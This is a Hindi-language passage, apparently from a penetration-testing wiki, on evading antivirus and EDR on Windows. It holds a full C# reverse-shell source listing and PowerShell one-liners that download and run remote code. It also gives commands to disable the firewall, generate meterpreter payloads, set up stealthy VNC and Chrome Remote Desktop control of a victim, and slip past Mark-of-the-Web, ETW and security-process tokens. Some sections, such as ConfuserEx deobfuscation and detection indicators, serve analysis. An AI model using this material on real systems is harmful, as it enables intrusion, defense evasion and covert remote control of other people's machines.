> कई obfuscation techniques में data को encrypt किया जाता है, जिससे binary की entropy बढ़ जाती है और AVs तथा EDRs के लिए इसका पता लगाना आसान हो जाता है। इस बारे में सावधान रहें और encryption को शायद केवल अपने code के उन खास sections पर लागू करें जो sensitive हैं या जिन्हें छिपाने की ज़रूरत है।

### ConfuserEx-Protected .NET Binaries को Deobfuscate करना

ConfuserEx 2 (या commercial forks) का इस्तेमाल करने वाले malware का विश्लेषण करते समय, protection की कई layers का सामना करना आम है, जो decompilers और sandboxes को रोक देती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से **लगभग original IL को restore करता है**, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।<sup>[[10]](#references)</sup>

1.  Anti-tampering हटाना – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, इसलिए कोई भी modification करने पर binary crash हो जाएगी। Encrypted metadata tables खोजने, XOR keys recover करने और साफ assembly को rewrite करने के लिए **AntiTamperKiller** का इस्तेमाल करें:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   आउटपुट में 6 anti-tamper पैरामीटर (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो अपना unpacker बनाने में उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फ़ाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) में feed करें।
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profile चुनें
     • de4dot control-flow flattening को उलटेगा, मूल namespaces, classes और variable names बहाल करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx decompilation को और कठिन बनाने के लिए direct method calls को lightweight wrappers (यानी *proxy calls*) से बदलता है। इन्हें **ProxyCall-Remover** से हटाएँ:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   इस चरण के बाद, आपको अपारदर्शी wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` दिखाई देने चाहिए।

4.  मैन्युअल सफ़ाई – परिणामी binary को dnSpy में चलाएँ और बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को खोजें, ताकि *असली* payload का पता लगाया जा सके। अक्सर malware इसे `<Module>.byte_0` के अंदर initialized TLV-encoded byte array के रूप में रखता है।

यह chain, malicious sample चलाए **बिना**, execution flow को पुनर्स्थापित करती है — offline workstation पर काम करते समय उपयोगी।

> 🛈  ConfuserEx `ConfusedByAttribute` नाम का एक custom attribute बनाता है, जिसका उपयोग samples की स्वचालित triage के लिए IOC के रूप में किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस project का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork उपलब्ध कराना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के ज़रिए software security को बेहतर बना सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि किसी external tool का उपयोग किए बिना और compiler में बदलाव किए बिना, compile time पर obfuscated code बनाने के लिए `C++11/14` language का उपयोग कैसे किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework से तैयार किए गए obfuscated operations की एक layer जोड़ें, जिससे application को crack करने की कोशिश करने वाले व्यक्ति का काम थोड़ा और मुश्किल हो जाएगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो विभिन्न PE files को obfuscate कर सकता है, जिनमें .exe, .dll, .sys शामिल हैं।
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक सरल metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) का उपयोग करने वाली LLVM-supported languages के लिए एक fine-grained code obfuscation framework है। ROPfuscator, regular instructions को ROP chains में बदलकर assembly code स्तर पर program को obfuscate करता है, जिससे सामान्य control flow की हमारी सहज समझ बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim में लिखा गया .NET PE Crypter है।
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में बदलकर फिर उसे load कर सकता है।

### LLVM compiler-assisted per-function self-masking

किसी implant को केवल उसके sleep के दौरान mask करने के बजाय, संशोधित LLVM X86 backend चुने हुए functions को निष्क्रिय रहने के दौरान XOR-masked रख सकता है। Function Peekaboo PoC, demangled names में `REG_` वाले names चुनता है, अंतिम machine code के आसपास position-independent entry/exit stubs जोड़ता है और `.text` में एक साझा masking handler emit करता है; source-level signatures और Windows x64 calling convention अपरिवर्तित रहते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

यह instruction selection और optimization के बाद किया जाना चाहिए, क्योंकि transformation में **हर emitted return** को शामिल करना और सटीक x86 layout जानना ज़रूरी है। एक pre-emission `MachineFunctionPass`, आख़िरी `MachineInstr::isReturn()` ढूँढ़ता है, उसे delete करता है ताकि अंतिम path appended epilogue में fall through हो, और पहले के returns को `JMP_1 handler` से बदलता है। हर return से पहले compiler द्वारा बनाया गया stack/frame teardown बनाए रखें; केवल return instruction को redirect करें।<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` और `emitFunctionBodyEnd()` per-function stubs emit करते हैं, जबकि `emitEndOfAsmFile()` handler emit करता है। Emission stages के बीच साझा symbols से prologue branch अपने बाद में आने वाले epilogue को target कर सकता है; manually emitted near `je` के लिए, `0F 84` के बाद चार-byte MC expression `target - address_after_je` लिखें। Handler को calls और jumps इसके बजाय `MCInst` objects (`CALL64pcrel32` और `JMP_1`) के रूप में emit किए जा सकते हैं। यदि किसी unselected function में कोई बदलाव नहीं हुआ हो, तो pass को `false` return करना चाहिए; PoC इस path में गलती से `true` return करता है।<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata और pre-CRT initialization

PoC, `.funcmeta` में एक XOR key और 16-byte records रखता है, जिनमें loader-relocated function pointer और runtime length शामिल होते हैं। C field `uint32_t` होने के बावजूद, handler record offset `+8` पर QWORD access करता है, जिससे length और उसकी padding दोनों पढ़ी जाती हैं, और records को `0x10` से आगे बढ़ाता है। PE section names में केवल आठ bytes होते हैं, इसलिए runtime lookup को `.funcmet` दिखता है। एक external patcher executable `.stub` जोड़ता है, stub में पुराना entry-point RVA सहेजता है और `AddressOfEntryPoint` को redirect करता है; PIC stub, `gs:[0x60]` → `[PEB+0x10]` से image base प्राप्त करता है, पहले से imported `VirtualProtect` को resolve करने के लिए PE32+ imports की जाँच करता है और CRT से पहले चलता है।<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` में एक sentinel सेट करता है और हर metadata function को call करता है। उसका हमेशा readable prologue function start को `gs:[0xF0]` में दर्ज करता है, sentinel का पता लगाता है और अभी भी clear body को छोड़ देता है। इसके बाद epilogue `call handler` करता है; handler द्वारा 13 registers (`0x68` bytes) save करने के बाद, `[rsp+0x68]` पर return address transformed function का अंत होता है, इसलिए `end - start` को उसके metadata record में लिखा जा सकता है। सभी bodies mask हो जाने के बाद stub sentinel clear करता है और `ImageBase + original_entry_point_RVA` पर jump करता है।<sup>[[38]](#references)[[39]](#references)</sup>

सामान्य call के दौरान, prologue body को decode करने के लिए उसी symmetric handler को call करता है। अंतिम path appended epilogue में fall through होता है, जबकि हर पहले का return सीधे shared handler पर jump करता है। सामान्य epilogue भी `call` के बजाय `jmp handler` का उपयोग करता है, ताकि re-masking के बाद handler का `ret`, original caller का return address consume करे और function result को `RAX` में बनाए रखे।<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive और analysis indicators

Handler मौजूदा record ढूँढ़ता है, fixed visible prologue (`इस build में 0x46` bytes) को छोड़ता है, बाकी हिस्से की protection `PAGE_EXECUTE_READWRITE` में बदलता है, उसे byte-by-byte low key byte से XOR करता है और फिर protection को `PAGE_EXECUTE_READ` पर सेट करता है। इसलिए यही loop entry पर decode और हर सामान्य exit पर encode करता है।<sup>[[38]](#references)[[39]](#references)</sup>

इस design के high-signal indicators में शामिल हैं:<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` के अंदर entry point और key के साथ relocated `.text` pointers रखने वाला `.funcmet` section;
- pre-CRT PEB, import-table और section-table parsing, जिसके बाद हर metadata pointer के ज़रिए calls किए जाते हैं;
- एक जैसे `call`/`pop` PIC prologues और एक handler पर redirect किए गए कई return sites;
- `gs:[0xE8]`, `gs:[0xF0]` और `gs:[0xF8]` में writes, जिनके बाद बार-बार `VirtualProtect` transitions और image-backed executable pages में bytewise XOR writes होती हैं।

यह memory-scanner evasion है, cryptographic protection नहीं: patched file में original clear body अब भी मौजूद रहती है, और debugger में `VirtualProtect` या XOR loop पर break करके active function dump किया जा सकता है। Single-byte XOR, readable metadata और fixed `0x46` boundary के कारण offline recovery भी आसान हो जाती है।<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC के TEB slots thread-local हैं, लेकिन modified code pages process-wide हैं। इसलिए concurrent या recursive entry के दौरान instructions दोबारा toggle हो सकते हैं, जबकि कोई दूसरा invocation उन्हें execute कर रहा हो; exceptions और nonlocal exits भी re-masking को bypass कर सकते हैं। एक robust implementation को transitions synchronize करने चाहिए, `lpflOldProtect` के ज़रिए लौटाई गई वास्तविक protection restore करनी चाहिए, hard-coded stub lengths से बचना चाहिए, x64 stack alignment के लिए `call` और `jmp` दोनों paths की जाँच करनी चाहिए और executable bytes rewrite करने के बाद `FlushInstructionCache` call करना चाहिए। Microsoft स्पष्ट रूप से कहता है कि executable code में बदलाव होने पर instruction-cache coherency बनाए रखने की ज़िम्मेदारी caller की है।<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

हो सकता है कि आपने internet से कुछ executables download करके चलाते समय यह screen देखी हो।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach का उपयोग करता है। इसका अर्थ है कि कम download किए जाने वाले applications SmartScreen को trigger करेंगे, जो end user को alert करेगा और file चलाने से रोकेगा (हालाँकि More Info -> Run anyway पर click करके file फिर भी चलाई जा सकती है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जिसका नाम Zone.Identifier है। Internet से files download करने पर यह अपने-आप बनता है और इसमें उस URL की जानकारी भी होती है जहाँ से file download की गई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Internet से download की गई file के लिए Zone.Identifier ADS की जाँच करना।</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना ज़रूरी है कि **trusted** signing certificate से signed executables **SmartScreen को trigger नहीं करेंगे**।

अपने payloads को Mark of The Web मिलने से रोकने का एक बहुत प्रभावी तरीका है उन्हें ISO जैसे किसी container के अंदर package करना। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) को **non NTFS** volumes पर लागू **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है, जो Mark-of-the-Web से बचने के लिए payloads को output containers में package करता है।

उदाहरण के लिए उपयोग:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

यहाँ [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके ISO files के अंदर payloads पैकेज करके SmartScreen को bypass करने का demo है।

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows में एक शक्तिशाली logging mechanism है, जो applications और system components को **events log** करने देता है। हालाँकि, security products इसका इस्तेमाल malicious activities को monitor और detect करने के लिए भी कर सकते हैं।

AMSI को disable (bypass) करने की तरह, user space process के **`EtwEventWrite`** function को बिना कोई events log किए तुरंत return कराने का तरीका भी संभव है। इसके लिए function को memory में patch करके तुरंत return कराया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से disable हो जाती है।

आपको **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** पर अधिक जानकारी मिल सकती है।<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries को memory में load करने का तरीका काफी समय से जाना जाता है और AV से पकड़े बिना अपने post-exploitation tools चलाने के लिए यह अब भी एक बेहतरीन तरीका है।

चूँकि payload सीधे memory में load होगा और disk को छुएगा नहीं, इसलिए हमें केवल पूरे process के लिए AMSI patch करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process शुरू किया जाता है**, अपने post-exploitation malicious code को उस नए process में inject किया जाता है, उसे execute किया जाता है और पूरा होने पर नए process को kill कर दिया जाता है। इस तरीके के फायदे और नुकसान, दोनों हैं। Fork and run तरीके का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होता है। इसका मतलब है कि अगर post-exploitation action में कुछ गलत हो जाए या पकड़ में आ जाए, तो हमारे **implant के बचने की संभावना बहुत अधिक होती है।** इसका नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **संभावना अधिक होती है।**

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

इसमें post-exploitation malicious code को **अपने ही process में** inject किया जाता है। इस तरह, आप नया process बनाने और उसे AV से scan करवाने से बच सकते हैं, लेकिन इसका नुकसान यह है कि अगर payload के execution में कुछ गलत हो जाए, तो **अपना beacon खोने की संभावना बहुत अधिक होती है**, क्योंकि वह crash हो सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो यह article देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप **PowerShell से** C# Assemblies भी load कर सकते हैं। [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## अन्य Programming Languages का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में सुझाए गए तरीके के अनुसार, compromised machine को **Attacker Controlled SMB share पर installed interpreter environment** तक access देकर अन्य languages का उपयोग करके malicious code execute करना संभव है।

SMB share पर Interpreter Binaries और environment तक access देकर आप compromised machine की memory में इन languages के arbitrary code को **execute कर सकते हैं**।

Repo के अनुसार: Defender अब भी scripts scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने के अधिक विकल्प** होते हैं। इन languages में random, unobfuscated reverse shell scripts के साथ testing सफल रही है।

## TokenStomping

Token stomping, EDR या AV जैसे security product के access token में बदलाव करता है। Token के privileges कम करने से process चलता रह सकता है, जबकि उसे privileged inspection या remediation actions करने से रोका जा सकता है।

इसे रोकने के लिए, Windows **external processes को** security processes के tokens के handles प्राप्त करने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software का उपयोग

### Chrome Remote Desktop

[**इस blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताए अनुसार, victim के PC पर Chrome Remote Desktop deploy करना और फिर उसका उपयोग करके उस पर नियंत्रण पाना तथा persistence बनाए रखना आसान है:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें, फिर Windows के लिए MSI file download करने हेतु MSI file पर click करें।
2. Victim पर installer को silently चलाएँ (admin आवश्यक है): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। Wizard आपसे authorize करने को कहेगा; आगे बढ़ने के लिए Authorize button पर click करें।
4. दिए गए command को आवश्यक बदलावों के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter GUI का उपयोग किए बिना PIN सेट करता है)।
 

## Advanced Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion एक बहुत जटिल विषय है। कभी-कभी आपको एक ही system में telemetry के कई अलग-अलग sources को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

जिस भी environment के विरुद्ध आप काम करेंगे, उसकी अपनी खूबियाँ और कमज़ोरियाँ होंगी।

मैं आपको प्रोत्साहित करता हूँ कि अधिक Advanced Evasion techniques की शुरुआती समझ पाने के लिए [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखें।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह भी [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth पर एक बेहतरीन talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **पुरानी Techniques**

### **जाँचें कि Defender किन हिस्सों को malicious मानता है**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं। यह **binary के हिस्सों को हटाता है**, जब तक कि उसे **पता न चल जाए कि Defender किस हिस्से को malicious मान रहा है**, और फिर उस हिस्से को आपके लिए अलग कर देता है।\
यही काम करने वाला एक और tool [**avred**](https://github.com/dobin/avred) है, जो यह service [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर web के ज़रिए उपलब्ध कराता है।

### **Telnet Server**

Windows10 तक, सभी Windows versions में एक **Telnet server** शामिल था, जिसे आप (administrator के रूप में) इस तरह install कर सकते थे:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

इसे सिस्टम शुरू होने पर **शुरू** होने के लिए सेट करें और अभी इसे **चलाएँ**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet port बदलें** (stealth) और firewall अक्षम करें:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**ON THE HOST**: _**winvnc.exe**_ चलाएँ और server configure करें:

- _Disable TrayIcon_ विकल्प enable करें
- _VNC Password_ में password सेट करें
- _View-Only Password_ में password सेट करें

फिर, binary _**winvnc.exe**_ और **नई बनाई गई** file _**UltraVNC.ini**_ को **victim** में ले जाएँ

#### **Reverse connection**

**attacker** को अपने **host** में binary `vncviewer.exe -listen 5900` **चलानी चाहिए**, ताकि वह reverse **VNC connection** पकड़ने के लिए **तैयार** रहे। फिर, **victim** में: winvnc daemon `winvnc.exe -run` शुरू करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` चलाएँ

**WARNING:** stealth बनाए रखने के लिए कुछ काम नहीं करने चाहिए

- अगर `winvnc` पहले से चल रहा है, तो उसे शुरू न करें; वरना एक [popup](https://i.imgur.com/1SROTTl.png) दिखेगा। `tasklist | findstr winvnc` से जाँचें कि वह चल रहा है या नहीं
- `UltraVNC.ini` को उसी directory में रखे बिना `winvnc` शुरू न करें, वरना [config window](https://i.imgur.com/rfMQWcf.png) खुल जाएगी
- मदद के लिए `winvnc -h` न चलाएँ, वरना एक [popup](https://i.imgur.com/oc18wcu.png) दिखेगा

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT के अंदर:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

अब `msfconsole -r file.rc` के साथ **lister** शुरू करें और **xml payload** को **execute** करें:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**मौजूदा defender process को बहुत तेज़ी से terminate कर देगा।**

### अपना reverse shell compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# reverse shell

इसे इस तरह compile करें:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

इसे इसके साथ उपयोग करें:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# कंपाइलर का उपयोग करके

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injector बनाने के लिए Python का उपयोग करने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space से AV/EDR को खत्म करना

Storm-2603 ने ransomware डालने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नाम की एक छोटी console utility का इस्तेमाल किया। यह टूल अपना **vulnerable लेकिन *signed* driver** साथ लाता है और इसका दुरुपयोग करके privileged kernel operations जारी करता है, जिन्हें Protected-Process-Light (PPL) AV services भी रोक नहीं सकतीं।<sup>[[12]](#references)</sup>

मुख्य बातें
1. **Signed driver**: Disk पर भेजी गई file का नाम `ServiceMouse.sys` है, लेकिन binary Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से signed driver `AToolsKrnl64.sys` है। चूँकि driver पर Microsoft का मान्य signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
